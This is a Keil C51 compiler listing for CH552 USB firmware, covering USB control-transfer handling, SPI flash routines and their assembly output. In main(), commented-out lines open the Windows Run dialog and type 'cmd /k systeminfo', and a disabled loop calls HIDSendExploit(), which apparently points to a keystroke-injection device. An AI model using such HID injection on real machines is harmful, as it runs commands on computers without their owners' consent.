1351   7                                      printf("Config\n");
1352   7                                      break;
1353   7                                  case USB_CLEAR_FEATURE:
1354   7                                      if((UsbSetupBuf->bRequestType & USB_REQ_RECIP_MASK) == USB_REQ_RECIP_ENDP)  // ∂Àµ„
1355   7                                      {
1356   8                                          switch(UsbSetupBuf->wIndexL)
1357   8                                          {
1358   9                                              case 0x82:
1359   9                                                  UEP2_CTRL = UEP2_CTRL & ~(bUEP_T_TOG | MASK_UEP_T_RES) | UEP_T_RES_NAK;
1360   9                                                  break;
1361   9                                              case 0x02:
1362   9                                                  UEP2_CTRL = UEP2_CTRL & ~(bUEP_R_TOG | MASK_UEP_R_RES) | UEP_R_RES_ACK;
1363   9                                                  break;
1364   9                                              case 0x81:
1365   9                                                  UEP1_CTRL = UEP1_CTRL & ~(bUEP_T_TOG | MASK_UEP_T_RES) | UEP_T_RES_NAK;
1366   9                                                  if(CH375CSW) mCH375UpCsw();
1367   9                                                  lastFSTALL = FSTALL;
1368   9                                                  FSTALL = 0;
1369   9                                                  break;
1370   9                                              case 0x01:
1371   9                                                  UEP1_CTRL = UEP1_CTRL & ~(bUEP_R_TOG | MASK_UEP_R_RES) | UEP_R_RES_ACK;
1372   9                                                  if(CH375CSW) mCH375UpCsw();
1373   9                                                  lastFSTALL = FSTALL;
1374   9                                                  FSTALL = 0;
1375   9                                                  break;
1376   9                                              default:
1377   9                                                  len = 0xFF;                         // ≤ª÷ß≥÷µƒ∂Àµ„
1378   9                                                  break;
1379   9                                          }
1380   8                                      }
1381   7                                      else
1382   7                                      {
1383   8                                          len = 0xFF;                                 // ≤ª «∂Àµ„≤ª÷ß≥÷
1384   8                                      }
1385   7                                      break;
1386   7                                  case USB_GET_INTERFACE:
1387   7                                      Ep0Buffer[0] = 0x00;
1388   7                                      if(SetupLen >= 1)
1389   7                                      {
1390   8                                          len = 1;
1391   8                                      }
1392   7                                      break;
1393   7                                  case USB_GET_STATUS:
1394   7                                      Ep0Buffer[0] = 0x00;
1395   7                                      Ep0Buffer[1] = 0x00;
1396   7                                      if(SetupLen >= 2)
1397   7                                      {
1398   8                                          len = 2;
1399   8                                      }
1400   7                                      else
1401   7                                      {
1402   8                                          len = SetupLen;
1403   8                                      }
1404   7                                      break;
1405   7                                  default:
1406   7                                      len = 0xFF;                                     // ≤Ÿ◊˜ ß∞‹
1407   7                                      break;
1408   7                              }
1409   6                          }
1410   5                      }
1411   4                      else
1412   4                      {
1413   5                          len = 0xFF;                                                 // SETUP∞¸≥§∂»¥ÌŒÛ
1414   5                      }
1415   4                      
1416   4                      if(len == 0xFF)                                                 // ≤Ÿ◊˜ ß∞‹
1417   4                      {
1418   5                          SetupReqCode = 0xFF;
1419   5                          UEP0_CTRL = bUEP_R_TOG | bUEP_T_TOG | UEP_R_RES_STALL | UEP_T_RES_STALL;// STALL
1420   5                      }
1421   4                      else if(len <= THIS_ENDP0_SIZE)                                 // …œ¥´ ˝æ›ªÚ’ﬂ◊¥Ã¨Ω◊∂Œ∑µªÿ0≥§∂»∞¸
1422   4                      {
1423   5                          UEP0_T_LEN = len;
1424   5                          UEP0_CTRL = bUEP_R_TOG | bUEP_T_TOG | UEP_R_RES_ACK | UEP_T_RES_ACK;    // ƒ¨»œ ˝æ›∞¸ «DATA1
1425   5                      }
1426   4                      else                                                            // œ¬¥´ ˝æ›ªÚ∆‰À¸
1427   4                      {
1428   5                          UEP0_T_LEN = 0;                                             // À‰»ª…–Œ¥µΩ◊¥Ã¨Ω◊∂Œ£¨µ´ «Ã·«∞‘§÷√…œ¥
             -´0≥§∂» ˝æ›∞¸“‘∑¿÷˜ª˙Ã·«∞Ω¯»Î◊¥Ã¨Ω◊∂Œ
1429   5                          UEP0_CTRL = bUEP_R_TOG | bUEP_T_TOG | UEP_R_RES_ACK | UEP_T_RES_ACK;    // ƒ¨»œ ˝æ›∞¸ «DATA1
1430   5                      }
1431   4                      break;
1432   4                  }
1433   3                  case UIS_TOKEN_IN | 0:                                              // endpoint 0# IN
1434   3                  {
1435   4                      switch(SetupReqCode)
1436   4                      {
1437   5                          case USB_GET_DESCRIPTOR:
1438   5                              len = SetupLen >= THIS_ENDP0_SIZE ? THIS_ENDP0_SIZE : SetupLen; // ±æ¥Œ¥´ ‰≥§∂»
1439   5                              memcpy(Ep0Buffer, pDescr, len);                         // º”‘ÿ…œ¥´ ˝æ›
1440   5                              SetupLen -= len;
1441   5                              pDescr += len;
1442   5                              UEP0_T_LEN = len;
1443   5                              UEP0_CTRL ^= bUEP_T_TOG;                                // ∑≠◊™
1444   5                              break;
1445   5                          case USB_SET_ADDRESS:
1446   5                              USB_DEV_AD = USB_DEV_AD & bUDA_GP_BIT | SetupLen;
1447   5                              UEP0_CTRL = UEP_R_RES_ACK | UEP_T_RES_NAK;
1448   5                              break;
1449   5                          default:
1450   5                              UEP0_T_LEN = 0;                                         // ◊¥Ã¨Ω◊∂ŒÕÍ≥…÷–∂œªÚ’ﬂ ««ø÷∆…œ¥´0≥§∂»
             - ˝æ›∞¸Ω· ¯øÿ÷∆¥´ ‰
1451   5                              UEP0_CTRL = UEP_R_RES_ACK | UEP_T_RES_NAK;
1452   5                              break;
1453   5                      }
1454   4                      break;
1455   4                  }
1456   3                  case UIS_TOKEN_OUT | 0:                                             // endpoint 0# OUT
1457   3                  {
1458   4                      UEP0_T_LEN = 0;
1459   4                      UEP0_CTRL ^= bUEP_R_TOG;
1460   4                      break;
1461   4                  }
1462   3                  default:
1463   3                      break;
1464   3              }
1465   2              UIF_TRANSFER = 0;                                                       // «Â÷–∂œ±Í÷æ
1466   2          }
1467   1          else if(UIF_BUS_RST)                                                        // USB◊‹œﬂ∏¥Œª
1468   1          {
1469   2              printf("Reset\n");
1470   2              UEP0_CTRL = UEP_R_RES_ACK | UEP_T_RES_NAK;
1471   2              UEP1_CTRL = bUEP_AUTO_TOG | UEP_R_RES_ACK | UEP_T_RES_NAK;
1472   2              UEP2_CTRL = bUEP_AUTO_TOG | UEP_R_RES_ACK | UEP_T_RES_NAK;
1473   2              USB_DEV_AD = 0x00;
1474   2              UIF_SUSPEND = 0;
1475   2              UIF_TRANSFER = 0;
1476   2              UIF_BUS_RST = 0;                                                        // «Â÷–∂œ±Í÷æ
1477   2              UsbReady = 0;
1478   2          }
1479   1          else if(UIF_SUSPEND)                                                        // USB◊‹œﬂπ“∆/ªΩ–—ÕÍ≥…
1480   1          {
1481   2              UIF_SUSPEND = 0;
1482   2              if(USB_MIS_ST & bUMS_SUSPEND)                                           // π“∆
1483   2              {
1484   3                  printf("Suspend\n");                                                // ÀØ√ﬂ◊¥Ã¨
1485   3              }
1486   2              else                                                                    // ªΩ–—
1487   2              {
1488   3                  printf("Awake\n");
1489   3              }
1490   2          }
1491   1          else
1492   1          {
1493   2              // “‚Õ‚µƒ÷–∂œ,≤ªø…ƒ‹∑¢…˙µƒ«Èøˆ
1494   2              USB_INT_FG = 0xFF;                                                      // «Â÷–∂œ±Í÷æ
1495   2          }
1496   1      }
1497          
1498          
1499          void main(void)
1500          {
1501   1          CfgFsys();                                      // CH552 ±÷”—°‘Ò≈‰÷√
1502   1          mDelaymS(100);                                   // …œµÁ—” ±,µ»¥˝ƒ⁄≤øæß’ÒŒ»∂®,±ÿº”
1503   1          mInitSTDIO();
1504   1      
1505   1          InitHostSPI0();
1506   1          WriteFlashEnable();                             // FLASH–¥ πƒ‹
1507   1          WriteFlashStatus(0x00);                         // …Ë÷√–æ∆¨Œ™Œﬁ±£ª§
1508   1          
1509   1          InitUSB_Device();
1510   1          while(!UsbReady);
1511   1        
1512   1          //mDelaymS(2000);
1513   1          //SendKey(KB_LeftGUI,KB_R);
1514   1          //mDelaymS(1000);
1515   1          //SendString("cmd /k systeminfo\n ",20);
1516   1          //mDelaymS(1000);
1517   1        
1518   1          while(1)
1519   1          {
1520   2            //if(IsHIDSendExploit)
1521   2            //{
1522   2              //HIDSendExploit();
1523   2              //IsHIDSendExploit=0;
1524   2            //}
1525   2            mDelaymS(100);
1526   2          }
1527   1      }
C51 COMPILER V9.60.0.0   MAIN                                                                          07/21/2022 19:09:33 PAGE 2   

ASSEMBLY LISTING OF GENERATED OBJECT CODE


             ; FUNCTION InitUSB_Device (BEGIN)
                                           ; SOURCE LINE # 249
                                           ; SOURCE LINE # 250
                                           ; SOURCE LINE # 251
0000 E4                CLR     A
0001 F5E2              MOV     USB_CTRL,A
                                           ; SOURCE LINE # 252
0003 53E27F            ANL     USB_CTRL,#07FH
                                           ; SOURCE LINE # 253
0006 43E229            ORL     USB_CTRL,#029H
                                           ; SOURCE LINE # 254
0009 F5E3              MOV     USB_DEV_AD,A
                                           ; SOURCE LINE # 255
000B 53E2BF            ANL     USB_CTRL,#0BFH
                                           ; SOURCE LINE # 256
000E 53D1FB            ANL     UDEV_CTRL,#0FBH
                                           ; SOURCE LINE # 257
0011 75D180            MOV     UDEV_CTRL,#080H
                                           ; SOURCE LINE # 258
0014 43D101            ORL     UDEV_CTRL,#01H
                                           ; SOURCE LINE # 260
0017 CE                XCH     A,R6
0018 7400        R     MOV     A,#HIGH Ep1Buffer
001A CE                XCH     A,R6
001B CF                XCH     A,R7
001C 7400        R     MOV     A,#LOW Ep1Buffer
001E CF                XCH     A,R7
001F 8EEF              MOV     UEP1_DMA+01H,R6
0021 8FEE              MOV     UEP1_DMA,R7
                                           ; SOURCE LINE # 261
0023 75EAC0            MOV     UEP4_1_MOD,#0C0H
                                           ; SOURCE LINE # 262
0026 75D212            MOV     UEP1_CTRL,#012H
                                           ; SOURCE LINE # 263
0029 CE                XCH     A,R6
002A 7400        R     MOV     A,#HIGH Ep0Buffer
002C CE                XCH     A,R6
002D CF                XCH     A,R7
002E 7400        R     MOV     A,#LOW Ep0Buffer
0030 CF                XCH     A,R7
0031 8EED              MOV     UEP0_DMA+01H,R6
0033 8FEC              MOV     UEP0_DMA,R7
                                           ; SOURCE LINE # 264
0035 75DC02            MOV     UEP0_CTRL,#02H
                                           ; SOURCE LINE # 265
0038 F5DD              MOV     UEP0_T_LEN,A
                                           ; SOURCE LINE # 266
003A F5D3              MOV     UEP1_T_LEN,A
                                           ; SOURCE LINE # 267
003C CE                XCH     A,R6
003D 7400        R     MOV     A,#HIGH Ep2Buffer
003F CE                XCH     A,R6
0040 CF                XCH     A,R7
0041 7400        R     MOV     A,#LOW Ep2Buffer
0043 CF                XCH     A,R7
0044 8EE5              MOV     UEP2_DMA+01H,R6
0046 8FE4              MOV     UEP2_DMA,R7
                                           ; SOURCE LINE # 268
0048 75EB04            MOV     UEP2_3_MOD,#04H
                                           ; SOURCE LINE # 269
004B 75D412            MOV     UEP2_CTRL,#012H
                                           ; SOURCE LINE # 270
004E F5D5              MOV     UEP2_T_LEN,A
                                           ; SOURCE LINE # 273
0050 43E104            ORL     USB_INT_EN,#04H
                                           ; SOURCE LINE # 274
0053 43E102            ORL     USB_INT_EN,#02H
                                           ; SOURCE LINE # 275
0056 43E101            ORL     USB_INT_EN,#01H
                                           ; SOURCE LINE # 276
0059 43D81F            ORL     USB_INT_FG,#01FH
                                           ; SOURCE LINE # 277
005C D2EA              SETB    IE_USB
                                           ; SOURCE LINE # 278
005E D2AF              SETB    EA
                                           ; SOURCE LINE # 279
0060 22                RET     
             ; FUNCTION InitUSB_Device (END)

             ; FUNCTION InitHostSPI0 (BEGIN)
                                           ; SOURCE LINE # 293
                                           ; SOURCE LINE # 294
                                           ; SOURCE LINE # 295
0000 53FC77            ANL     SPI0_SETUP,#077H
                                           ; SOURCE LINE # 296
0003 75FA60            MOV     SPI0_CTRL,#060H
                                           ; SOURCE LINE # 297
0006 75FB02            MOV     SPI0_CK_SE,#02H
                                           ; SOURCE LINE # 298
0009 4392F0            ORL     P1_MOD_OC,#0F0H
                                           ; SOURCE LINE # 299
000C 4393F0            ORL     P1_DIR_PU,#0F0H
                                           ; SOURCE LINE # 300
000F 22                RET     
             ; FUNCTION InitHostSPI0 (END)

             ; FUNCTION ReadFlashStatus (BEGIN)
                                           ; SOURCE LINE # 309
                                           ; SOURCE LINE # 310
                                           ; SOURCE LINE # 313
0000 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 314
0002 75F905            MOV     SPI0_DATA,#05H
0005         ?C0003:
0005 30FBFD            JNB     S0_FREE,?C0003
                                           ; SOURCE LINE # 315
0008 75F9FF            MOV     SPI0_DATA,#0FFH
000B         ?C0005:
000B 30FBFD            JNB     S0_FREE,?C0005
;---- Variable 'FlashStatus' assigned to Register 'R7' ----
000E AFF9              MOV     R7,SPI0_DATA
                                           ; SOURCE LINE # 316
0010 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 318
                                           ; SOURCE LINE # 319
0012 22                RET     
             ; FUNCTION ReadFlashStatus (END)

             ; FUNCTION WaitFlashBusy (BEGIN)
                                           ; SOURCE LINE # 328
                                           ; SOURCE LINE # 329
0000         ?C0008:
                                           ; SOURCE LINE # 330
0000 120000      R     LCALL   ReadFlashStatus
0003 EF                MOV     A,R7
0004 20E0F9            JB      ACC.0,?C0008
                                           ; SOURCE LINE # 331
0007 22                RET     
             ; FUNCTION WaitFlashBusy (END)

             ; FUNCTION _WriteFlashStatus (BEGIN)
                                           ; SOURCE LINE # 340
;---- Variable 'status' assigned to Register 'R7' ----
                                           ; SOURCE LINE # 341
                                           ; SOURCE LINE # 342
0000 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 343
0002 75F901            MOV     SPI0_DATA,#01H
0005         ?C0011:
0005 30FBFD            JNB     S0_FREE,?C0011
                                           ; SOURCE LINE # 344
0008 8FF9              MOV     SPI0_DATA,R7
000A         ?C0013:
000A 30FBFD            JNB     S0_FREE,?C0013
                                           ; SOURCE LINE # 345
000D D294              SETB    SPI_CS
                                           ; SOURCE LINE # 346
000F 22                RET     
             ; FUNCTION _WriteFlashStatus (END)

             ; FUNCTION WriteFlashForbidden (BEGIN)
                                           ; SOURCE LINE # 355
                                           ; SOURCE LINE # 356
                                           ; SOURCE LINE # 357
0000 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 358
0002 75F904            MOV     SPI0_DATA,#04H
0005         ?C0016:
0005 30FBFD            JNB     S0_FREE,?C0016
                                           ; SOURCE LINE # 359
0008 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 360
000A 22                RET     
             ; FUNCTION WriteFlashForbidden (END)

             ; FUNCTION WriteFlashEnable (BEGIN)
                                           ; SOURCE LINE # 369
                                           ; SOURCE LINE # 370
                                           ; SOURCE LINE # 371
0000 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 372
0002 75F906            MOV     SPI0_DATA,#06H
0005         ?C0019:
0005 30FBFD            JNB     S0_FREE,?C0019
                                           ; SOURCE LINE # 373
0008 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 374
000A 22                RET     
             ; FUNCTION WriteFlashEnable (END)

             ; FUNCTION CheckFlashWriteEnable (BEGIN)
                                           ; SOURCE LINE # 383
                                           ; SOURCE LINE # 384
                                           ; SOURCE LINE # 387
0000 120000      R     LCALL   ReadFlashStatus
;---- Variable 'WRENStatus' assigned to Register 'R7' ----
                                           ; SOURCE LINE # 388
0003 EF                MOV     A,R7
0004 5402              ANL     A,#02H
0006 6402              XRL     A,#02H
0008 6003              JZ      ?C0023
                                           ; SOURCE LINE # 389
                                           ; SOURCE LINE # 390
000A 120000      R     LCALL   WriteFlashEnable
                                           ; SOURCE LINE # 391
                                           ; SOURCE LINE # 392
000D         ?C0023:
000D 22                RET     
             ; FUNCTION CheckFlashWriteEnable (END)

             ; FUNCTION _EraseFlash (BEGIN)
                                           ; SOURCE LINE # 401
0000 900000      R     MOV     DPTR,#Dst_Addr
0003 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 402
                                           ; SOURCE LINE # 403
0006 120000      R     LCALL   CheckFlashWriteEnable
                                           ; SOURCE LINE # 404
0009 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 405
000B 75F920            MOV     SPI0_DATA,#020H
000E         ?C0024:
000E 30FBFD            JNB     S0_FREE,?C0024
                                           ; SOURCE LINE # 406
0011 900000      R     MOV     DPTR,#Dst_Addr
0014 A3                INC     DPTR
0015 E0                MOVX    A,@DPTR
0016 FD                MOV     R5,A
0017 A3                INC     DPTR
0018 E0                MOVX    A,@DPTR
0019 FE                MOV     R6,A
001A A3                INC     DPTR
001B E0                MOVX    A,@DPTR
001C FF                MOV     R7,A
001D E4                CLR     A
001E FC                MOV     R4,A
001F 7810              MOV     R0,#010H
0021 120000      E     LCALL   ?C?ULSHR
0024 8FF9              MOV     SPI0_DATA,R7
0026         ?C0026:
0026 30FBFD            JNB     S0_FREE,?C0026
                                           ; SOURCE LINE # 407
0029 900000      R     MOV     DPTR,#Dst_Addr
002C A3                INC     DPTR
002D A3                INC     DPTR
002E E0                MOVX    A,@DPTR
002F FE                MOV     R6,A
0030 A3                INC     DPTR
0031 E0                MOVX    A,@DPTR
0032 FF                MOV     R7,A
0033 E4                CLR     A
0034 FD                MOV     R5,A
0035 FC                MOV     R4,A
0036 7808              MOV     R0,#08H
0038 120000      E     LCALL   ?C?ULSHR
003B 8FF9              MOV     SPI0_DATA,R7
003D         ?C0028:
003D 30FBFD            JNB     S0_FREE,?C0028
                                           ; SOURCE LINE # 408
0040 900000      R     MOV     DPTR,#Dst_Addr
0043 E0                MOVX    A,@DPTR
0044 FC                MOV     R4,A
0045 A3                INC     DPTR
0046 E0                MOVX    A,@DPTR
0047 FD                MOV     R5,A
0048 A3                INC     DPTR
0049 E0                MOVX    A,@DPTR
004A FE                MOV     R6,A
004B A3                INC     DPTR
004C E0                MOVX    A,@DPTR
004D FF                MOV     R7,A
004E 8FF9              MOV     SPI0_DATA,R7
0050         ?C0030:
0050 30FBFD            JNB     S0_FREE,?C0030
                                           ; SOURCE LINE # 409
0053 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 410
0055 020000      R     LJMP    WaitFlashBusy
             ; FUNCTION _EraseFlash (END)

             ; FUNCTION _ByteReadFlash (BEGIN)
                                           ; SOURCE LINE # 420
0000 900000      R     MOV     DPTR,#StarAddr
0003 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 421
                                           ; SOURCE LINE # 422
;---- Variable 'dat' assigned to Register 'R3' ----
0006 E4                CLR     A
0007 FB                MOV     R3,A
                                           ; SOURCE LINE # 424
0008 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 425
000A 75F903            MOV     SPI0_DATA,#03H
000D         ?C0033:
000D 30FBFD            JNB     S0_FREE,?C0033
                                           ; SOURCE LINE # 426
0010 900000      R     MOV     DPTR,#StarAddr
0013 A3                INC     DPTR
0014 E0                MOVX    A,@DPTR
0015 FD                MOV     R5,A
0016 A3                INC     DPTR
0017 E0                MOVX    A,@DPTR
0018 FE                MOV     R6,A
0019 A3                INC     DPTR
001A E0                MOVX    A,@DPTR
001B FF                MOV     R7,A
001C E4                CLR     A
001D FC                MOV     R4,A
001E 7810              MOV     R0,#010H
0020 120000      E     LCALL   ?C?ULSHR
0023 8FF9              MOV     SPI0_DATA,R7
0025         ?C0035:
0025 30FBFD            JNB     S0_FREE,?C0035
                                           ; SOURCE LINE # 427
0028 900000      R     MOV     DPTR,#StarAddr
002B A3                INC     DPTR
002C A3                INC     DPTR
002D E0                MOVX    A,@DPTR
002E FE                MOV     R6,A
002F A3                INC     DPTR
0030 E0                MOVX    A,@DPTR
0031 FF                MOV     R7,A
0032 E4                CLR     A
0033 FD                MOV     R5,A
0034 FC                MOV     R4,A
0035 7808              MOV     R0,#08H
0037 120000      E     LCALL   ?C?ULSHR
003A 8FF9              MOV     SPI0_DATA,R7
003C         ?C0037:
003C 30FBFD            JNB     S0_FREE,?C0037
                                           ; SOURCE LINE # 428
003F 900000      R     MOV     DPTR,#StarAddr
0042 A3                INC     DPTR
0043 A3                INC     DPTR
0044 A3                INC     DPTR
0045 E0                MOVX    A,@DPTR
0046 FF                MOV     R7,A
0047 E4                CLR     A
0048 8FF9              MOV     SPI0_DATA,R7
004A         ?C0039:
004A 30FBFD            JNB     S0_FREE,?C0039
                                           ; SOURCE LINE # 429
004D 75F9FF            MOV     SPI0_DATA,#0FFH
0050         ?C0041:
0050 30FBFD            JNB     S0_FREE,?C0041
0053 ABF9              MOV     R3,SPI0_DATA
                                           ; SOURCE LINE # 430
0055 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 432
0057 CF                XCH     A,R7
0058 EB                MOV     A,R3
0059 CF                XCH     A,R7
                                           ; SOURCE LINE # 433
005A 22                RET     
             ; FUNCTION _ByteReadFlash (END)

             ; FUNCTION _ByteWriteFlash (BEGIN)
                                           ; SOURCE LINE # 443
0000 900000      R     MOV     DPTR,#StarAddr
0003 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 444
                                           ; SOURCE LINE # 445
0006 120000      R     LCALL   WriteFlashEnable
                                           ; SOURCE LINE # 446
0009 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 447
000B 75F902            MOV     SPI0_DATA,#02H
000E         ?C0044:
000E 30FBFD            JNB     S0_FREE,?C0044
                                           ; SOURCE LINE # 448
0011 900000      R     MOV     DPTR,#StarAddr
0014 A3                INC     DPTR
0015 E0                MOVX    A,@DPTR
0016 FD                MOV     R5,A
0017 A3                INC     DPTR
0018 E0                MOVX    A,@DPTR
0019 FE                MOV     R6,A
001A A3                INC     DPTR
001B E0                MOVX    A,@DPTR
001C FF                MOV     R7,A
001D E4                CLR     A
001E FC                MOV     R4,A
001F 7810              MOV     R0,#010H
0021 120000      E     LCALL   ?C?ULSHR
0024 8FF9              MOV     SPI0_DATA,R7
0026         ?C0046:
0026 30FBFD            JNB     S0_FREE,?C0046
                                           ; SOURCE LINE # 449
0029 900000      R     MOV     DPTR,#StarAddr
002C A3                INC     DPTR
002D A3                INC     DPTR
002E E0                MOVX    A,@DPTR
002F FE                MOV     R6,A
0030 A3                INC     DPTR
0031 E0                MOVX    A,@DPTR
0032 FF                MOV     R7,A
0033 E4                CLR     A
0034 FD                MOV     R5,A
0035 FC                MOV     R4,A
0036 7808              MOV     R0,#08H
0038 120000      E     LCALL   ?C?ULSHR
003B 8FF9              MOV     SPI0_DATA,R7
003D         ?C0048:
003D 30FBFD            JNB     S0_FREE,?C0048
                                           ; SOURCE LINE # 450
0040 900000      R     MOV     DPTR,#StarAddr
0043 E0                MOVX    A,@DPTR
0044 FC                MOV     R4,A
0045 A3                INC     DPTR
0046 E0                MOVX    A,@DPTR
0047 FD                MOV     R5,A
0048 A3                INC     DPTR
0049 E0                MOVX    A,@DPTR
004A FE                MOV     R6,A
004B A3                INC     DPTR
004C E0                MOVX    A,@DPTR
004D FF                MOV     R7,A
004E 8FF9              MOV     SPI0_DATA,R7
0050         ?C0050:
0050 30FBFD            JNB     S0_FREE,?C0050
                                           ; SOURCE LINE # 451
0053 900000      R     MOV     DPTR,#dat
0056 E0                MOVX    A,@DPTR
0057 F5F9              MOV     SPI0_DATA,A
0059         ?C0052:
0059 30FBFD            JNB     S0_FREE,?C0052
                                           ; SOURCE LINE # 452
005C D294              SETB    SPI_CS
                                           ; SOURCE LINE # 453
005E 020000      R     LJMP    WaitFlashBusy
             ; FUNCTION _ByteWriteFlash (END)

             ; FUNCTION _BulkReadFlash (BEGIN)
                                           ; SOURCE LINE # 465
0000 900000      R     MOV     DPTR,#StarAddr
0003 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 466
                                           ; SOURCE LINE # 469
0006 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 470
0008 75F90B            MOV     SPI0_DATA,#0BH
000B         ?C0055:
000B 30FBFD            JNB     S0_FREE,?C0055
                                           ; SOURCE LINE # 471
000E 900000      R     MOV     DPTR,#StarAddr
0011 A3                INC     DPTR
0012 E0                MOVX    A,@DPTR
0013 FD                MOV     R5,A
0014 A3                INC     DPTR
0015 E0                MOVX    A,@DPTR
0016 FE                MOV     R6,A
0017 A3                INC     DPTR
0018 E0                MOVX    A,@DPTR
0019 FF                MOV     R7,A
001A E4                CLR     A
001B FC                MOV     R4,A
001C 7810              MOV     R0,#010H
001E 120000      E     LCALL   ?C?ULSHR
0021 8FF9              MOV     SPI0_DATA,R7
0023         ?C0057:
0023 30FBFD            JNB     S0_FREE,?C0057
                                           ; SOURCE LINE # 472
0026 900000      R     MOV     DPTR,#StarAddr
0029 A3                INC     DPTR
002A A3                INC     DPTR
002B E0                MOVX    A,@DPTR
002C FE                MOV     R6,A
002D A3                INC     DPTR
002E E0                MOVX    A,@DPTR
002F FF                MOV     R7,A
0030 E4                CLR     A
0031 FD                MOV     R5,A
0032 FC                MOV     R4,A
0033 7808              MOV     R0,#08H
0035 120000      E     LCALL   ?C?ULSHR
0038 8FF9              MOV     SPI0_DATA,R7
003A         ?C0059:
003A 30FBFD            JNB     S0_FREE,?C0059
                                           ; SOURCE LINE # 473
003D 900000      R     MOV     DPTR,#StarAddr
0040 A3                INC     DPTR
0041 A3                INC     DPTR
0042 A3                INC     DPTR
0043 E0                MOVX    A,@DPTR
0044 FF                MOV     R7,A
0045 8FF9              MOV     SPI0_DATA,R7
0047         ?C0061:
0047 30FBFD            JNB     S0_FREE,?C0061
                                           ; SOURCE LINE # 474
004A E4                CLR     A
004B F5F9              MOV     SPI0_DATA,A
004D         ?C0063:
004D 30FBFD            JNB     S0_FREE,?C0063
                                           ; SOURCE LINE # 475
;---- Variable 'i' assigned to Register 'R6/R7' ----
0050 E4                CLR     A
0051 FF                MOV     R7,A
0052 FE                MOV     R6,A
0053         ?C0065:
0053 D3                SETB    C
0054 900000      R     MOV     DPTR,#Len+01H
0057 E0                MOVX    A,@DPTR
0058 9F                SUBB    A,R7
0059 900000      R     MOV     DPTR,#Len
005C E0                MOVX    A,@DPTR
005D 9E                SUBB    A,R6
005E 4021              JC      ?C0066
                                           ; SOURCE LINE # 476
                                           ; SOURCE LINE # 477
0060 75F9FF            MOV     SPI0_DATA,#0FFH
0063         ?C0068:
0063 30FBFD            JNB     S0_FREE,?C0068
0066 900000      R     MOV     DPTR,#RcvBuffer
0069 E0                MOVX    A,@DPTR
006A FB                MOV     R3,A
006B A3                INC     DPTR
006C E0                MOVX    A,@DPTR
006D FA                MOV     R2,A
006E A3                INC     DPTR
006F E0                MOVX    A,@DPTR
0070 F9                MOV     R1,A
0071 8F82              MOV     DPL,R7
0073 8E83              MOV     DPH,R6
0075 E5F9              MOV     A,SPI0_DATA
0077 120000      E     LCALL   ?C?CSTOPTR
                                           ; SOURCE LINE # 478
007A 0F                INC     R7
007B BF0001            CJNE    R7,#00H,?C0336
007E 0E                INC     R6
007F         ?C0336:
007F 80D2              SJMP    ?C0065
0081         ?C0066:
                                           ; SOURCE LINE # 479
0081 D294              SETB    SPI_CS
                                           ; SOURCE LINE # 480
0083 22                RET     
             ; FUNCTION _BulkReadFlash (END)

             ; FUNCTION _BulkWriteFlash (BEGIN)
                                           ; SOURCE LINE # 491
0000 900000      R     MOV     DPTR,#StarAddr
0003 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 492
                                           ; SOURCE LINE # 495
0006 120000      R     LCALL   WaitFlashBusy
                                           ; SOURCE LINE # 496
0009 E4                CLR     A
000A FF                MOV     R7,A
000B 120000      R     LCALL   _WriteFlashStatus
                                           ; SOURCE LINE # 497
000E 120000      R     LCALL   WriteFlashEnable
                                           ; SOURCE LINE # 499
0011 C294              CLR     SPI_CS
                                           ; SOURCE LINE # 500
0013 75F902            MOV     SPI0_DATA,#02H
0016         ?C0071:
0016 30FBFD            JNB     S0_FREE,?C0071
                                           ; SOURCE LINE # 501
0019 900000      R     MOV     DPTR,#StarAddr
001C A3                INC     DPTR
001D E0                MOVX    A,@DPTR
001E FD                MOV     R5,A
001F A3                INC     DPTR
0020 E0                MOVX    A,@DPTR
0021 FE                MOV     R6,A
0022 A3                INC     DPTR
0023 E0                MOVX    A,@DPTR
0024 FF                MOV     R7,A
0025 E4                CLR     A
0026 FC                MOV     R4,A
0027 7810              MOV     R0,#010H
0029 120000      E     LCALL   ?C?ULSHR
002C 8FF9              MOV     SPI0_DATA,R7
002E         ?C0073:
002E 30FBFD            JNB     S0_FREE,?C0073
                                           ; SOURCE LINE # 502
0031 900000      R     MOV     DPTR,#StarAddr
0034 A3                INC     DPTR
0035 A3                INC     DPTR
0036 E0                MOVX    A,@DPTR
0037 FE                MOV     R6,A
0038 A3                INC     DPTR
0039 E0                MOVX    A,@DPTR
003A FF                MOV     R7,A
003B E4                CLR     A
003C FD                MOV     R5,A
003D FC                MOV     R4,A
003E 7808              MOV     R0,#08H
0040 120000      E     LCALL   ?C?ULSHR
0043 8FF9              MOV     SPI0_DATA,R7
0045         ?C0075:
0045 30FBFD            JNB     S0_FREE,?C0075
                                           ; SOURCE LINE # 503
0048 900000      R     MOV     DPTR,#StarAddr
004B E0                MOVX    A,@DPTR
004C FC                MOV     R4,A
004D A3                INC     DPTR
004E E0                MOVX    A,@DPTR
004F FD                MOV     R5,A
0050 A3                INC     DPTR
0051 A3                INC     DPTR
0052 E0                MOVX    A,@DPTR
0053 FF                MOV     R7,A
0054 8FF9              MOV     SPI0_DATA,R7
0056         ?C0077:
0056 30FBFD            JNB     S0_FREE,?C0077
                                           ; SOURCE LINE # 504
;---- Variable 'i' assigned to Register 'R6/R7' ----
0059 E4                CLR     A
005A FF                MOV     R7,A
005B FE                MOV     R6,A
005C         ?C0079:
005C D3                SETB    C
005D 900000      R     MOV     DPTR,#Len+01H
0060 E0                MOVX    A,@DPTR
0061 9F                SUBB    A,R7
0062 900000      R     MOV     DPTR,#Len
0065 E0                MOVX    A,@DPTR
0066 9E                SUBB    A,R6
0067 401E              JC      ?C0080
                                           ; SOURCE LINE # 505
